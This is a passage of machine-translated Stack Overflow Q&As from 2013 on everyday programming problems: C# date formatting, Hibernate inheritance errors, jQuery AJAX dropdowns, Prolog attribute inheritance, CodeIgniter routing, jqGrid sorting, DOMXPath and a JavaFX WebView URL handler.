## 回答 #1

> 赞同：7
> 
> 时间：2013-03-21T18:37:34.690

您返回的`DateTime`对象没有格式 - 它只是原始日期和时间。要将其转换为新格式，请在`DateTime`对象中调用`ToString`它，例如：

```
string formattedDate = result.ToString("dd MMM yyyy"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:37:53.570

`DateTime`对象不以字符串格式存储日期。相反，您*可以*`DateTime`在获取字符串表示时使用您喜欢的格式输出值：

```
// assuming you have date DateTime object variable named dateTime
dateTime.ToString("dd MMM yyyyy"); 
```

# tfs - TFS中Unbind应用对服务器的影响

> ID：15555472
> 
> 赞同：0
> 
> 时间：2013-03-21T18:35:55.547
> 
> 标签：tfs

如果我在 Visual Studio 2010 中从源代码管理中取消绑定 Web 应用程序，它会对 TFS 服务器产生任何影响吗？即记录解除绑定等。

虽然我已经能够找到许多关于“如何”执行此操作（取消绑定）的资源，但我找不到任何关于 GUI 选择在幕后所做的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T22:46:44.640

我不能明确地说它对 Web 应用程序有什么作用，但据我所知，对于 C++/C# 解决方案，它会`SolutionName.vssssc`在您的解决方案旁边保存一个源代码控制信息文件（文件或类似文件）来记录绑定。

我认为绑定只是项目在 TFS 和您的 PC 中存储位置的地图，因此当您在线时可以找到它们并相互关联 - 所以我相信它们在您的 PC 本地，并且服务器端什么都不会发生你绑定/解除绑定。

Web 项目可能存在差异。也有可能我对绑定的许多假设（纯粹基于多年来对其行为的观察）是完全错误的，所以请对以上所有内容持怀疑态度:-)

# spring - JPA-Hibernate 异常“无法通过反射 getter 获取字段值”持续存在

> ID：15555476
> 
> 赞同：0
> 
> 时间：2013-03-21T18:36:01.910
> 
> 标签：spring, hibernate, hashcode, spring-data

我有一个 Spring 3.2.1、Hibernate 4.1.9 和 Spring Data 应用程序。我正在为我的实体使用继承类型，层次结构如下：一个超类 DomainEntity 和两个类 SmartElement 和 LowLevelEntity 从它继承，并由其他类继承。SmartElement 具有一组 LowLevelEntities，并且关系是双向的。

域实体类

```
@Entity
@Table(name = "entity")
@Inheritance(strategy = InheritanceType.JOINED)
public class DomainEntity implements Serializable 
{
 @Id
@GeneratedValue(strategy = GenerationType.IDENTITY)
@Column(name = "entity_id", unique = true)
private long uuid;

@Column(name = "entity_name", unique = true)
protected String name;

@ManyToOne()
@JoinColumn(name = "location_id")
protected Location location;

@ManyToOne(cascade = {CascadeType.ALL})
@JoinColumn(name = "state_id")
protected State state;
// getters and setters
} 
```

SmartElment 类

```
@Entity
@Table(name = "smart_element")
@Inheritance(strategy = InheritanceType.JOINED)
@PrimaryKeyJoinColumn(name = "smart_element_id")
public class SmartElement extends DomainEntity implements Serializable
{
@OneToMany (mappedBy = "connectedEntity", 
        cascade = {CascadeType.ALL}, orphanRemoval = true)
protected Set<LowLevelEntity> lowLevelEntityCollection;
 // getters and setters
} 
```

和 LowLevelEntity 类

```
@Entity
@Table(name = "low_level_entity")
@Inheritance(strategy = InheritanceType.JOINED)
@PrimaryKeyJoinColumn(name = "low_level_entity_id")
public class LowLevelEntity extends DomainEntity implements Serializable
{

@ManyToOne()
@JoinColumn(name = "smart_element_id")
protected SmartElement connectedEntity;

    public void setConnectedEntity(SmartElement connectedEntity)
{       
    if (connectedEntity != null)
    {
        this.connectedEntity = connectedEntity;
        this.connectedEntity.addLowLevelEntity(this);

    } else 
    {
        if (this.connectedEntity != null)
        {
            this.connectedEntity.removeLowLevelEntity(this);
        }
        this.connectedEntity = connectedEntity;
}

// other fields and getters/setters
} 
```

现在继承自 SmartElement 的类之​​一非常简单，Lighting 类

```
@Entity
@Table(name = "lighting")
@PrimaryKeyJoinColumn(name = "lighting_id")
public class Lighting extends SmartElement implements Serializable
{

@Enumerated(EnumType.STRING)
protected LightingLevelType lightingLevel = LightingLevelType.NONE; 

public LightingLevelType getLightingLevel()
{
    return lightingLevel;
}

public void setLightingLevel(LightingLevelType lightingLevel)
{
    this.lightingLevel = lightingLevel;
}
} 
```

LightingLevel 是一个枚举类

```
public enum LightingLevelType
{

NONE(0), QUARTER(0.25), HALF(0.5), THREE_QUARTERS(0.75), MAX(1);

private double value;

private LightingLevelType(double value)
{
    this.value = value;
}

public double getValue(){
    return value;
}
} 
```

每当我执行以下操作时，我都会收到错误消息

```
SmartElement element = new Lighting("lamp", new SmartElementState(), kitchen); 
//fields inherited from the superclass DomainEntity name, state and location
LowLevelEntity sensor = new LowLevelEntity("sensor", new SensorState(), kitchen);
sensor.setConnectedEntity(element); 
```

并通过级联保存实体，方法是使用 Spring Data JPARepository 保存方法持久保存包含位置。

错误说：

```
could not get a field value by reflection getter of model.highlevel.smartelement.lighting.Lighting.lightingLevel; 
```

如果我执行相同的代码但将 Lighting 更改为 SmartElement 我没有错误

```
SmartElement element = new SmartElement("lamp", new SmartElementState(), kitchen); 
```

如果我评论该行也不会发生`sensor.setConnectedEntity(element);`

有时，使用不同名称的 Lighting 实例不会出错，这让我认为 equals 和 hashCode 方法的实现可能存在问题。我为此尝试了不同的方法，例如[此处](http://www.onjava.com/pub/a/onjava/2006/09/13/dont-let-hibernate-steal-your-identity.html?page=3 "这里")，或者仅使用没有 id 的元素名称，但仍然出现错误。

```
 @Override
public boolean equals(final Object other)
{
    if (this == other) return true;
    if (! (other instanceof DomainEntity)) return false;

    DomainEntity castOther = (DomainEntity) other;
    return new EqualsBuilder()
        .append(name, castOther.name).isEquals();

}

@Override
public int hashCode()
{
    return new HashCodeBuilder()
    .append(name).toHashCode();
} 
```

我根本不明白发生了什么以及我做错了什么。如果有人有任何想法或遇到过这样的案例，我将非常感谢您的意见。我很抱歉这篇长篇文章，但我认为拥有代码也会更容易理解。

**更新**

我已经尝试了几件事来尝试找出错误的来源。

1.  将 LightingLevelType 类中的类型更改为普通类型没有效果，错误仍然存​​在。
2.  将 Lighting 类中的字段更改为`public int type`也没有效果，仅删除它可以修复错误，但这不是一个选项。
3.  每当我尝试在 LowLevelEntity 对象中设置 connectedEntity 字段时，就会发生错误，就像`sensor.setConnectedEntity(element);`该方法仅执行此操作一样`this.connectedEntity = connectedEntity`。如果我只将对象添加到 SmartElement 集而不设置反向关系，则没有错误，但 connectedEntity 为空。如果我从数据库中检索两个对象，请设置反向关系并再次保存，则不会出现错误。

所以我倾向于认为这与在关系的拥有部分中设置连接有关（如果我没记错的话，LowLevelEntity 类是所有者）涉及尚未持久化的实体然后保存实体通过该位置的级联。奇怪的是，我刚刚使用@Repeat(50) 运行了这个测试，但只是将 smartElement 的名称从“lamp”更改为“kitchen_lamp”：

```
SmartElement element = new Lighting("kitchen_lamp", new SmartElementState(), kitchen);
LowLevelEntity lamp_kitchen = new LowLevelEntity("lamp_kitchen", new SensorState(), kitchen); 
```

并且没有错误。此外，在控制台中，当智能元素具有除“kitchen_lamp”之外的任何其他名称时，休眠首先插入 LowLevelEntity，然后尝试插入 smartElement，并使用名称“kitchen_lamp”反转插入，然后没有错误。有谁知道为什么会发生这种情况，如果有什么我可以做的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-04T13:02:14.707

我曾经有过类似的问题。您需要指定 ManyToOne 的 targetEntity，反之亦然。

```
public class LowLevelEntity extends DomainEntity implements Serializable
{
    @ManyToOne(targetEntity=SmartElement.class)
    @JoinColumn(name = "smart_element_id")
    protected SmartElement connectedEntity;
} 
```

和

```
public class SmartElement extends DomainEntity implements Serializable
{
    @OneToMany (mappedBy = "connectedEntity", targetEntity=LowLevelEntity.class
            cascade = {CascadeType.ALL}, orphanRemoval = true)
    protected Set<LowLevelEntity> lowLevelEntityCollection;
     // getters and setters
} 
```

编辑（在第一条评论之后）：

我想我现在记得我在 Spring Data Repository 中使用错误的 findBy 方法得到了那个错误。请检查您所有的 findBy 方法！我不确定他们如何使用枚举，也许这就是问题所在。

# php - PHP 和 Jquery 下拉框

> ID：15555481
> 
> 赞同：-1
> 
> 时间：2013-03-21T18:36:19.037
> 
> 标签：php, jquery

我有一个下拉菜单，当用户选择时，我必须将所选值传递给选择查询。

我在同一页面中有下拉和查询，所以我不知道，该怎么做？

据我所知，JS 值不能传递给 PHP。我该怎么做呢 ？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:39:38.797

如果您希望页面相同，您只有一种方法，那就是通过 AJAX。Jquery 使得 ajax 请求很容易调用，所以你可以使用它....

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:06:45.090

关于drop down box值的变化

```
$("sel selectore").change(function(){

if($(this).val()!=="")
  {ajax_call($(this).val)}
else
 {
   //display error for selecting proper val
 }

}); 
```

这是ajax调用函数

```
function ajax_call(param)
$.ajax({
   url:"ur php file",
   data:{val:param},
   type:"POST",
 error: function(jqXHR,textStatus,errorThrown) {
            // ERROR
            },
   sucess:function(result)
   {
     //code for return reslylt
   }
});
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T18:40:07.453

```
var value;
$('#select-box').change(function() {
value = $(this).val();
}); 
```

变量“值”将保存您的选择框的值。请注意，您需要将“选择框”替换为选择框的 ID。

然后，您需要使用 ajax POST 将此值发送到 PHP。

```
$.ajax({
        type: "POST",
        url: YOUR_URL
        data: "post_var=" + value,
        dataType: "text",
        error: function(jqXHR,textStatus,errorThrown) {
            // ERROR
            },
        success: function(xml) {
            // SUCCESS
        }
    }); 
```

# inheritance - Prolog - SWI：如何创建一个结构来计算赋予它的值

> ID：15555484
> 
> 赞同：1
> 
> 时间：2013-03-21T18:36:31.367
> 
> 标签：inheritance, prolog

我是 prolog 的第一次用户，我已经使用它大约一周了，从[这里](http://www.computing.dcu.ie/~jhayes/Logic/)学习各种基础知识，这在一定程度上有所帮助。我一直在为一个虚构的游戏标题设计一个数据库查找，用户可以在其中查阅动物寓言以获得游戏中给定角色的统计数据。如果你问我，这听起来像是一个很棒的项目:)

我一直在努力学习“框架”来描述我的节点以及如何使用它们，所以我将使用的格式将是这些方面的东西。我一直在学习的最新项目是 prolog 中的“数字”以及它们的工作原理，在教程中它看起来很简单，直到我想以更动态的方式使用它。

我为我的数据节点进行了以下设置。（伪代码）

框架：名称（字符）、父级（无）、base_stat（8.0）。

框架：名称（NPC），父母（角色）。

框架：名称（敌人），父母（npc）。

框架：名称（red_faction），父母（敌人），atk_bonus（1.5），spd_bonus（1.25），def_bonus（0.25）。

框架：名称（blue_faction），父母（敌人），atk_bonus（1），spd_bonus（1），def_bonus（1）。

框架：名称（fire_warrior），父级（red_faction），级别（1.0），控股（无）。

框架：名称（water_consort），父级（blue_faction），级别（1.0），控股（无）。

咨询时，我想向用户返回以下统计信息：攻击（？），速度（？），防御（？）。

我希望使用一个方程式来计算“？” 我的程序的区域，将使用以下等式“（base_stat + level）* stat_bonus”。所以是这样的： -

```
compute(attribute) :-
    stat_bonus(stat bonus from parent node for required stat example:atk_bonus)
    base_stat(value from the character node's base_stat)
    level(value from the character we are looking up: eg water_consort lvl1)
    attribute is (level+base_stat) * stat_bonus 
```

在一位导师简要解释了序言中数字的代数方法后，我提出了这个结构。有这样的例子： -

```
student(jack, 25).
student(jill, 21).

avg_Score(Z) :-
    student(jack, X),
    student(jill, Y),
    Z = (X + Y)/2. 
```

我知道我需要提取 X 和 Y 的值，如果我想重新查询这些值，我将不得不重复提取以使用它们。

现在回到我的小项目，我有许多派系节点（完整的图表有 3 个，但没有必要超过两个，因为我假设需要的过程可以应用 N 次），我如何获得我的计算信息？

假设我要为火战士请求数据，我的系统想要计算一个统计数据（比如说攻击），它会参考我的等式。我需要以下信息：

1.  父节点“red_faction”给予的攻击加成
2.  gggrandparent 节点“字符”给出的 base_stat
3.  实例节点的级别

我的导师给我的例子只有在我对所有请求都进行硬编码并且非常有限的情况下才有效。有没有一种方法可以用于每个派系的“N”个派系和“M”个角色实例？我会再次打扰她，但她要等到复活节后才有空，我希望在周末的某个时候完成。据我所知，Prolog 的继承非常好，但我不知道如何解决这个问题。

提前感谢您提供的任何建设性意见。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T22:55:38.437

欢迎来到 Prolog！我很高兴你试一试，我希望你发现它很好地满足了你的想象，因为你似乎有很多！

你在这里为 Prolog 使用了很多奇怪的术语。我不清楚您所说的“框架”或“节点”或“提取”是什么意思，我很确定您正在以一种不恰当的方式使用“咨询”。我不知道这是因为本教程是为 SICStus 编写的，还是只是通常的混淆。我通常也不会想到在 Prolog 中进行继承，但我认为我确实理解这部分内容。所以我希望你能一起玩，我们会看看我是否能回答你的问题。

第一件事。这没什么大不了的，但平均分数应该这样实现：

```
avg_score(Z) :-
  student(jack, X),
  student(jill, Y),
  Z is (X + Y) / 2\.   % <-- note the use of 'is' instead of '=' 
```

这是一个常见的初学者错误。Prolog 默认情况下不计算代数，所以当你说`(X + Y) / 2`你真正在做的只是构建一个表达式时，与`div(plus(X, Y), 2)`. 真正的区别在于，它`is`知道如何评估代数表达式，例如`(X + Y) / 2`but not `div(plus(X, Y), 2)`。`clpfd`（我会预先警告您，如果您从头开始使用 Prolog并使用`#=`而不是. ，您会发现 Prolog 更有意义`is`。）

`avg_score`不，当然，没有什么帮助的是它`jack`并且`jill`嵌入其中。有一天，您可能想要计算所有学生的平均分数。首先让我们计算平均值：

```
average(L, Average) :-
  sum(L, Sum),
  length(L, Length),
  Average is Sum / Length.

% this is overly complex because I wanted to show you 
% the tail recursive version
sum(L, Sum) :- sum(L, 0, Sum).

sum([], Sum, Sum).
sum([X|Xs], Acc, Sum) :- Acc1 is X + Acc, sum(Xs, Acc1, Sum). 
```

现在我们可以这样得到所有学生的平均值：

```
avg_score(Z) :-
  findall(X, student(_, X), Scores),
  average(Scores, Z). 
```

我不知道这是否与您的要求有关，但似乎它可能会有所帮助，所以它就在那里。

当然，另一种可能性是将事物参数化。我们可以获取原始代码并由学生对其进行参数化：

```
avg_score(Student1, Student2, Z) :-
  student(Student1, X),
  student(Student2, Y),
  Z is (X + Y) / 2. 
```

这似乎与查询动物寓言更相关。而不是问`attack(X)`你会问`attack(fire_warrior, X)`。

当您对 Prolog 如此陌生时，我讨厌将您送到 Logtalk，但我怀疑它可能包含您正在寻找的一些答案。它特别擅长以 vanilla Prolog 可能不具备的方式处理继承。但这可能是一个很大的转移。例如，您可以像这样处理查询攻击状态的继承链：

```
% this is the inheritance tree
parent_class(character, base).
parent_class(npc, character).
parent_class(enemy, npc).
parent_class(red_faction, enemy).
parent_class(blue_faction, enemy).
parent_class(fire_warrior, red_faction).
parent_class(water_consort, blue_faction).

% these are the attack bonuses
attack_bonus(base, 0).
attack_bonus(red_faction, 1.5).
attack_bonus(blue_faction, 1).

calc_attack_bonus(X, Bonus) :-
  attack_bonus(X, Bonus), !.
calc_attack_bonus(X, Bonus) :-
  \+ attack_bonus(X, Bonus),
  parent_class(X, Parent),
  calc_attack_bonus(Parent, Bonus). 
```

这似乎适用于一些基本查询：

```
?- calc_attack_bonus(fire_warrior, Bonus).
Bonus = 1.5.

?- calc_attack_bonus(character, Bonus).
Bonus = 0. 
```

我不知道你是否想要这种行为：

```
?- calc_attack_bonus(tree, Bonus).
false. 
```

如果没有，很容易修复（如果`parent_class`失败，将 Bonus 统一为 0，否则重复）。

然而，这并不是所有可扩展的。一种更可扩展的方法可能是这样的：

```
% these are the attack bonuses
attribute(attack_bonus, base, 0).
attribute(attack_bonus, red_faction, 1.5).
attribute(attack_bonus, blue_faction, 1).

% base stats
attribute(base_stat, character, 8.0).

attribute(level, fire_warrior, 1.0). 
```

现在我们可以轻松编写我们需要的规则了：

```
calc_attribute(X, Attribute, Value) :-
  attribute(X, Attribute, Value), !.
calc_attribute(X, Attribute, Value) :-
  \+ attribute(X, Attribute, Value),
  parent_class(X, Parent),
  calc_attribute(Parent, Attribute, Value). 
```

现在攻击变得容易：

```
attack(X, Value) :-
  calc_attribute(X, attack_bonus, Bonus),
  calc_attribute(X, base_stat, Base),
  calc_attribute(X, level, Level),
  Value is (Level + Base) * Bonus. 
```

不过，我们需要更多地概括一下才能到达我们可以写的地方`compute`，因为理想情况下，我们想说一些类似的东西`compute(fire_warrior, attack, Value)`。要做到这一点，我们需要知道它`attack_bonus`是相关的`attack`，但我们不知道。让我们稍微重构`attribute`一下：

```
% these are the attack bonuses
attribute(base,         bonus(attack), 0).
attribute(red_faction,  bonus(attack), 1.5).
attribute(blue_faction, bonus(attack), 1).

% base stats
attribute(character, base_stat, 8.0).

attribute(fire_warrior, level, 1.0). 
```

现在我们正在做饭：

```
compute(X, Attribute, Value) :-
  calc_attribute(X, bonus(Attribute), Bonus),
  calc_attribute(X, base_stat, Base),
  calc_attribute(X, level, Level),
  Value is (Level + Base) * Bonus. 
```

瞧：

```
?- compute(fire_warrior, attack, Value).
Value = 13.5. 
```

我希望这就是你想要的。:)

**大编辑**

为了好玩，我想我会看看 Logtalk 会是什么样子，[Logtalk](http://logtalk.org/)是 Prolog 的一种面向对象的扩展语言。我对 Logtalk*很*陌生，所以这可能是也可能不是一个好方法，但它确实“成功了”，所以让我们看看它是否更符合您的要求。一、基础对象：

```
:- object(base).

  :- public(base_stat/1).
  :- public(attack/1).
  :- public(bonus/2).
  :- public(level/1).
  :- public(compute/2).

  bonus(attack, 0).
  base_stat(0).
  level(0).

  compute(Attribute, Value) :-
      ::bonus(Attribute, Bonus),
      ::base_stat(Base),
      ::level(Level),
      Value is (Level + Base) * Bonus.

:- end_object. 
```

这基本上定义了我们将要存储的关于每件事的事实，以及如何计算您感兴趣的属性。接下来我们建立对象层次结构：

```
:- object(character, extends(base)).
    base_stat(8.0).
:- end_object.

:- object(npc, extends(character)).
:- end_object.

:- object(enemy, extends(npc)).
:- end_object.

:- object(red_faction, extends(enemy)).
    bonus(attack, 1.5).
    bonus(speed, 1.25).
    bonus(defense, 0.25).
:- end_object.

:- object(blue_faction, extends(enemy)).
    bonus(attack, 1).
    bonus(speed, 1).
    bonus(defense, 1).
:- end_object.

:- object(fire_warrior, extends(red_faction)).
    level(1.0).
    holding(nothing).
:- end_object.

:- object(water_consort, extends(blue_faction)).
    level(1.0).
    holding(nothing).
:- end_object. 
```

现在使用它非常简单：

```
?- fire_warrior::compute(attack, X).
X = 13.5.

?- water_consort::compute(attack, X).
X = 9.0. 
```

我希望这有帮助！

# php - 简单的 URL 路由不适用于 CodeIgniter

> ID：15555494
> 
> 赞同：5
> 
> 时间：2013-03-21T18:36:56.993
> 
> 标签：php, codeigniter, routing

我对 CodeIgniter 还很陌生，并且完成了我的第一个项目。然而，在我把它放到我的托管站点之前，我想使用 CodeIgniter 在配置文件夹中提供的 routes.php 文件来清理 URL。

我的网站将使用以下网址加载：

```
http://fakehost:8888/TheWorksPlumbing/index.php/theWorksPlumbingController/index/home
http://fakehost:8888/TheWorksPlumbing/index.php/theWorksPlumbingController/index/about
http://fakehost:8888/TheWorksPlumbing/index.php/theWorksPlumbingController/index/services 
```

它还将使用以下默认控制器 url 加载主页：`http://fakehost:8888/TheWorksPlumbing/`

但是，我希望网站的每个页面都有一个 url，但无法使其正常工作。例如，我想拥有：

```
http://fakehost:8888/TheWorksPlumbing/home
http://fakehost:8888/TheWorksPlumbing/about
http://fakehost:8888/TheWorksPlumbing/services 
```

下面是 theWorksPlumbingController 控制器文件的代码：

```
class TheWorksPlumbingController extends CI_Controller {

    public function index($page = 'home'){

        if ( !file_exists('application/views/'.$page.'.php') ) {
            show_404();
        }

        $this->load->view('templates/header');
        $this->load->view($page);
        $this->load->view('templates/footer');
    }
} 
```

这是我的 routes.php 文件中不起作用的代码：

```
$route['default_controller'] = "theWorksPlumbingController";
$route['404_override'] = '';
$route['(:any)'] = "index.php/theWorksPlumbingController/index"; 
```

我需要添加或更改什么以使站点仅加载 /home 或 /about 或 /services？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-21T18:47:23.920

```
$route['home'] = 'theWorksPlumbingController/index/home';
$route['about'] = 'theWorksPlumbingController/index/about';
$route['services'] = 'theWorksPlumbingController/index/services'; 
```

可能会这样做..虽然我从未尝试过这样的设置。通常在 CI 中，您为每个页面创建一个方法，如下所示：

```
class TheWorksPlumbingController extends CI_Controller {

    public function home(){

        $this->load->view('templates/header');
        $this->load->view('home');
        $this->load->view('templates/footer');
    }

    public function about(){

        $this->load->view('templates/header');
        $this->load->view('about');
        $this->load->view('templates/footer');
    }

    public function services(){

        $this->load->view('templates/header');
        $this->load->view('services');
        $this->load->view('templates/footer');
    }
} 
```

可以通过

```
http://www.example.com/index.php/theWorksPlumbingController/home
http://www.example.com/index.php/theWorksPlumbingController/about
http://www.example.com/index.php/theWorksPlumbingController/services 
```

并且可以通过

```
$route['home'] = 'theWorksPlumbingController/home';
$route['about'] = 'theWorksPlumbingController/about';
$route['services'] = 'theWorksPlumbingController/services'; 
```

[https://www.codeigniter.com/user_guide/general/routing.html](https://www.codeigniter.com/user_guide/general/routing.html)

# jqgrid - jqgrid排序不正确

> ID：15555497
> 
> 赞同：0
> 
> 时间：2013-03-21T18:37:03.910
> 
> 标签：jqgrid

```
13  1.1.16  Failed   
14  1.1.17  Failed
15  1.1.18  Failed
16  1.1.19  Passed   
2   1.1.2   Failed   
17  1.1.20  Failed
18  1.1.21  Passed   
19  1.1.22  Passed 
```

我有 2 个查询。

1\. 我在上面的 jqgrid 表中有排序问题。当我对作为文本的第三列进行排序时，它没有正确排序。排序基于第二个字段，这也是不正确的。

2.如果值为“失败”，如何更改颜色。

```
$("#grid").jqGrid({
    datastr: mydata,
    datatype: 'jsonstring',
    width: 800,
    colNames:['Slno','Item','Result', 'Desc'],
    colModel:[
    {name:'slno', index:'slno', key: true, width:50, sorttype: 'int'},
    {name:'item', index:'item', width:50, sortable: false},
    {name:'result', index:'item', width:30, sorttype: 'text'},
    {name:'desc', index:'desc', width:100}
    ],
    pager: '#pager',
    viewrecords: true,
    sortorder: "asc",
    caption:"jqGrid Example",
    jsonReader: {
        root: "rows",
        repeatitems: false,
        id: "0"
    },
    rowNum: 30
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T04:58:44.853

You have wrong index for result

change

```
 {name:'result', index:'item', width:30, sorttype: 'text'}, 
```

to

```
 {name:'result', index:'result', width:30, sorttype: 'text'}, 
```

Then to change color [See this answer](https://stackoverflow.com/questions/14908962/jqgrid-change-entire-rows-font-color-if-one-column-is-filled/14929331#14929331)

**Or** you can also use formatter like given below

```
 {name:'result', index:'result', width:30, sorttype: 'text',formatter:passedOrFailedFormatter},

    function passedOrFailedFormatter(cellvalue, options, rowObject) {

        if (cellvalue=="Passed") {
            return "<font color=#008000> "+ cellvalue +" </font>";
        } else {
            return "<font color=#FF0000> "+ cellvalue +" </font>";
        }

    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:50:41.827

回答您的第二个问题。（假设您需要更改行的颜色）

```
$("#grid").jqGrid({
    datastr: mydata,
    datatype: 'jsonstring',
    width: 800,
    colNames:['Slno','Item','Result', 'Desc'],
    colModel:[
    {name:'slno', index:'slno', key: true, width:50, sorttype: 'int'},
    {name:'item', index:'item', width:50, sortable: false},
    {name:'result', index:'result', width:30, sorttype: 'text'},
    {name:'desc', index:'desc', width:100}
    ],
    pager: '#pager',
    viewrecords: true,
    sortorder: "asc",
    caption:"jqGrid Example",
    jsonReader: {
        root: "rows",
        repeatitems: false,
        id: "0"
    },

afterInsertRow: function ( rowid, rowdata )
                    {
                        if ( ( rowdata.result) == 'Failed' )
                        {
                            $( this ).jqGrid( 'setRowData', rowid, false, { background: '#EBADAD'} );//
                        },
    rowNum: 30
}); 
```

如果您只需要更改该特定单元格的颜色，请替换为：

```
afterInsertRow: function ( rowid, rowdata )
                        {
                            if ( ( rowdata.result) == 'Failed' )
                            {
                               $(this).jqGrid('setCell', rowid, "result", "", { 'background-color': '#EBADAD'
                            });
                            },
        rowNum: 30
    }); 
```

# html - 使用下拉列表更改网页的文本颜色

> ID：15555504
> 
> 赞同：0
> 
> 时间：2013-03-21T18:37:13.130
> 
> 标签：html

我试图弄清楚如何使用下拉菜单更改网页的文本颜色，我已经设法使用下拉菜单成功更改背景颜色，该下拉菜单是以下代码：

谁能告诉我如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:52:27.300

更改`<body>`元素的文本颜色：

```
document.body.style.color="#"+backGround.options[backGround.selectedIndex].value 
```

见[演示](http://jsfiddle.net/EedAU/1/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:57:38.427

首先，将你的 javascript 移到一个单独的函数中（这只是一个很好的做法，并且更容易阅读/更新）并设置你的 onChange(); 调用该函数，并将 select 的值传递给它。

然后把你的函数写成这样：

```
<html>
    <head>
        <script type="text/javascript">
            function updateTextColour(value) {
                document.body.style.color = '#' + value;
            }
        </script>
    </head>
    <body>
        <form>Change the background color:
            <select name="backGround" size="1" onChange="updateTextColour(this.value)">
                <option value="000000">[Black]</option>
                <option value="FF0400">[Red]</option>
                <option value="EFE800">[Yellow]</option>
                <option value="05EF00">[Green]</option>
                <option value="0206FF">[Blue]</option>
                <option value="FFFFFF" selected>[White]</option>
            </select>
        </form>
    </body>
</html> 
```

此外，您实际上可以使用[这些颜色的词](http://en.wikipedia.org/wiki/Web_colors#HTML_color_names)...尝试以下 JS：

```
document.body.style.color = "red";
document.body.style.color = "blue";
document.body.style.color = "grey"; 
```

# php - DOMXPath 查询不返回任何结果

> ID：15555505
> 
> 赞同：0
> 
> 时间：2013-03-21T18:37:15.733
> 
> 标签：php, html, xpath, domxpath

我很难理解 RegEx，而 XPath 似乎也让我感到困惑。

属于的Html `$htmlsrc`：

```
<div class="text" style="font-family:monospace;">
<ol>
<li style="font-weight: normal; vertical-align:top;">
<div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;">
sQrNWk8+aiRtcn/gFM9ptAf8m3NcRf4av4m76rUZeAA=
</div>
</li>
</ol>
</div> 
```

正在查询字符串的 PHP：

```
 $dom = new DOMDocument();
        $dom->loadHTML($htmlsrc);
        $xpath = new DOMXPath($dom);
        $tags = $xpath->query('//div/ol/li/div');
        var_dump($tags); 
```

我真的很想返回`sQrNWk8+aiRtcn/gFM9ptAf8m3NcRf4av4m76rUZeAA=`但是`var_dump($tags)`只是显示一个空对象：

```
object(DOMNodeList)#24 (1) {
  ["length"]=>
  int(1)
} 
```

# node.js - Node.JS 调试节点检查器不是单步执行？

> ID：15555506
> 
> 赞同：1
> 
> 时间：2013-03-21T18:37:16.523
> 
> 标签：node.js

节点检查器在干净的系统上安装和加载正常 - 代码在断点处中断，但是当我尝试单步执行（F10 或点击按钮）或尝试继续执行时，它只是挂起。有没有人见过这种行为？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-29T16:51:50.613

我在 Node 0.10.1 上遇到了同样的问题，但是 node-inspector 中的断点以前工作得很好（在硬盘驱动器崩溃之前）。**我恢复到节点 0.8.22 并且问题得到了解决。**我用 Homebrew 安装了 Node，所以要恢复我所做的节点（使用你想要的版本哈希）：

```
$ cd /usr/local
$ brew versions node
$ git checkout 3c4a714 Library/Formula/node.rb
$ brew unlink node
$ brew install node
$ git checkout HEAD -- Library/Formula/node.rb
$ brew switch node 0.8.22 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T06:58:56.383

自从迁移到 0.10.0 和现在迁移到 0.10.1 后，我遇到了同样的问题。它不是节点检查器，因为 WebStorm 表现出类似的问题。它不会在我的代码中获取断点，如果我使用调试器命令，它会中断并以红色显示文件（带有行号），但不会加载它 - 即使它在堆栈上显示正确的路径。

# java - JavaFX 停止在 WebView 中打开 URL - 改为在浏览器中打开

> ID：15555510
> 
> 赞同：15
> 
> 时间：2013-03-21T18:37:29.677
> 
> 标签：java, webview, jvm, javafx-2, javafx

我使用的嵌入式 WebView 浏览器需要对特定 URL 进行特殊处理，以便在本机默认浏览器而不是 WebView 中打开它们。实际的浏览部分工作正常，但我还需要阻止 WebView 显示该页面。我可以想到几种方法来做到这一点，但它们都不起作用。这是我的代码：

```
this.wv.getEngine().locationProperty().addListener(new ChangeListener<String>() {
    @Override
    public void changed(ObservableValue<? extends String> observable, String oldValue, String newValue)
    {
        Desktop d = Desktop.getDesktop();
        try
        {
            URI address = new URI(observable.getValue());
            if ((address.getQuery() + "").indexOf("_openmodal=true") > -1)
            {
                // wv.getEngine().load(oldValue); // 1
                // wv.getEngine().getLoadWorker().cancel(); // 2
                // wv.getEngine().executeScript("history.back()"); // 3
                d.browse(address);
            }
        }
        catch (IOException | URISyntaxException e)
        {
            displayError(e);
        }
    }
}); 
```

有关在三种情况下发生的情况的更多信息

## 1.加载之前的地址

```
wv.getEngine().load(oldValue); 
```

这会杀死 JVM。有趣的是，该页面在本机浏览器中可以正常打开。

```
# A fatal error has been detected by the Java Runtime Environment:
#
#  EXCEPTION_ACCESS_VIOLATION (0xc0000005) at pc=0x000000005b8fef38, pid=7440, tid=8000
#
# JRE version: 7.0_09-b05
# Java VM: Java HotSpot(TM) 64-Bit Server VM (23.5-b02 mixed mode windows-amd64 compressed oops)
# Problematic frame:
# C  [jfxwebkit.dll+0x2fef38]  Java_com_sun_webpane_platform_BackForwardList_bflItemGetIcon+0x184f58
#
# Failed to write core dump. Minidumps are not enabled by default on client versions of Windows
#
# An error report file with more information is saved as:
# C:\Users\Greg Balaga\eclipse\Companyapp\hs_err_pid7440.log
#
# If you would like to submit a bug report, please visit:
#   http://bugreport.sun.com/bugreport/crash.jsp
# The crash happened outside the Java Virtual Machine in native code.
# See problematic frame for where to report the bug. 
```

## 2\. 取消工人

```
wv.getEngine().getLoadWorker().cancel(); 
```

什么都不做，页面在 WebView 和本机浏览器中加载。

## 3\. 使用 history.back()

```
